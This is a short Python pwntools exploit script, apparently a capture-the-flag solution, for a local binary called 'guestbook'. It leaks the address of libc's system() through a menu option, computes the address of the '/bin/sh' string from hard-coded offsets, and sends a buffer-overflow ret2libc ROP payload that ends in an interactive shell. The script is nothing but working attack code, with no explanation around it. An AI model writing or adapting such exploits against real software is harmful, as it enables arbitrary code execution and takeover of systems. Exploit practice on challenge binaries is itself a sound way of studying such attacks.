from pwn import *
context.log_level='debug'
r= process("./guestbook")

r.recvuntil(">>>")
r.sendline('aaa')
r.recvuntil(">>>")
r.sendline('bbb')
r.recvuntil(">>>")
r.sendline('ccc')
r.recvuntil(">>>")
r.sendline('ddd')

r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>>")
r.sendline("6")

data = r.recv(24)
system = u32(data[-4:])
print "[*]system:0x%x" %system

binsh = system + 0x15ba0b - 0x3ada0

rop = p32(system)+p32(0xdeadbeef)+p32(binsh)
payload = 'a'*0x2c + p32(0xdeadbeef)+rop
r.recvuntil(">>")
r.sendline("2")
r.recvuntil(">>>")
r.sendline("6")
r.recvuntil(">>>")

r.sendline(payload)
r.send('\n')


r.recvuntil(">>")
r.sendline("3")


r.interactive()
